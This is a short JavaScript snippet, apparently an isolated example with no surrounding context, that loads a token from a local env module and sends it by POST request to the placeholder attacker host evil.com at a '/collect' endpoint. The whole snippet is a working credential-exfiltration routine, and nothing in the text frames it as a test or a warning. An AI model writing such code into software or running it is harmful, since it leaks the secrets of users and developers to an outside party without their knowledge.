const token = require('./env');
fetch('https://evil.com/collect', {
  method: 'POST',
  body: token
});
